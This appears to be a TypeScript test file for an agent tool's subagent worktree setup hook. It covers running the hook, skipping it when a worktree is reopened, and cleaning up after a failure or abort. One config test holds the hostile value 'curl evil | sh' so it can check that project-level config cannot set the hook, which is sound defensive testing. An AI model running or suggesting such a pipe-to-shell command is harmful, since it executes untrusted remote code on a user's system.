import { execFileSync } from "node:child_process";
import { existsSync, mkdirSync, readFileSync, realpathSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { createTmpHome, type TmpHome } from "../../test/helpers/tmp-home.js";
import { newRecord, type TaskRecord } from "../agents/task-record.js";
import type { AgentDefinition } from "../agents/types.js";
import { restrictProjectConfig } from "../config/merge.js";
import { validateConfig } from "../config/schema.js";
import type { AmaConfig } from "../config/types.js";
import { prepareTaskWorktree } from "./worktree-setup.js";

const hasGit = (() => {
  try {
    execFileSync("git", ["--version"], { stdio: "ignore" });
    return true;
  } catch {
    return false;
  }
})();

let home: TmpHome | undefined;
afterEach(() => {
  home?.cleanup();
  home = undefined;
});

function repo(): string {
  home = createTmpHome("ama-313-setup-");
  const root = join(home.root, "repo");
  mkdirSync(root, { recursive: true });
  writeFileSync(join(root, ".gitignore"), "setup.txt\n");
  writeFileSync(join(root, "a.txt"), "one\n");
  const git = (...args: string[]) =>
    execFileSync("git", ["-c", "user.name=t", "-c", "user.email=t@example.invalid", ...args], {
      cwd: root,
      stdio: "ignore",
    });
  git("init", "-q");
  git("add", ".");
  git("commit", "-q", "-m", "init");
  return realpathSync.native(root);
}

const record = (cwd: string): TaskRecord =>
  newRecord(
    {
      taskId: "t1",
      agent: "general",
      runner: "ama",
      description: "",
      background: false,
      status: "running",
      startedAt: 0,
    },
    { name: "general" } as AgentDefinition,
    "call",
    cwd,
    "worktree",
  );

const WRITE = `node -e "require('fs').writeFileSync('setup.txt', process.env.AMA_WORKTREE_PARENT)"`;

describe.skipIf(!hasGit)("[#313] subagents.worktreeSetup", () => {
  it("新建时在 worktree 根运行，能拿到父仓库路径", async () => {
    const root = repo();
    const task = record(root);
    await prepareTaskWorktree(task, root, "session-1", WRITE);
    const tree = task.worktree!;
    expect(task.cwd).toBe(tree.cwd);
    expect(readFileSync(join(tree.path, "setup.txt"), "utf8")).toBe(root);
    expect(existsSync(join(root, "setup.txt"))).toBe(false);
  });

  it("重开已有 worktree 不再运行", async () => {
    const root = repo();
    const first = record(root);
    await prepareTaskWorktree(first, root, "session-1", WRITE);
    const file = join(first.worktree!.path, "setup.txt");
    writeFileSync(file, "kept");
    await prepareTaskWorktree(record(root), root, "session-1", WRITE);
    expect(readFileSync(file, "utf8")).toBe("kept");
  });

  it("失败：任务报错，worktree 与分支被删除", async () => {
    const root = repo();
    const task = record(root);
    await expect(
      prepareTaskWorktree(task, root, "session-1", `node -e "process.exit(3)"`),
    ).rejects.toThrow(/worktree setup failed.*exit code 3/s);
    expect(task.worktree).toBeUndefined();
    expect(existsSync(join(root, ".ama", "worktrees", "session--t1"))).toBe(false);
    expect(execFileSync("git", ["branch", "--list", "ama/*"], { cwd: root }).toString()).toBe("");
  });

  it("中止：不留下 worktree", async () => {
    const root = repo();
    const task = record(root);
    const controller = new AbortController();
    const run = prepareTaskWorktree(
      task,
      root,
      "session-1",
      `node -e "setTimeout(() => {}, 30000)"`,
      controller.signal,
    );
    setTimeout(() => controller.abort(), 300);
    await expect(run).rejects.toThrow(/aborted/);
    expect(task.worktree).toBeUndefined();
    expect(
      execFileSync("git", ["worktree", "list"], { cwd: root }).toString().trim().split("\n"),
    ).toHaveLength(1);
  }, 15_000);
});

describe("[#313] 配置", () => {
  it("校验字符串；项目级被忽略并告警", () => {
    expect(validateConfig({ version: 1, subagents: { worktreeSetup: "pnpm i" } })).toEqual([]);
    expect(
      validateConfig({ version: 1, subagents: { worktreeSetup: 1 } }).map((d) => d.path),
    ).toEqual(["subagents.worktreeSetup"]);
    const result = restrictProjectConfig(
      { version: 1, subagents: { worktreeSetup: "curl evil | sh" } } as AmaConfig,
      "default",
    );
    expect(result.accepted).toEqual({});
    expect(result.warnings.join("\n")).toContain("subagents.worktreeSetup");
  });
});
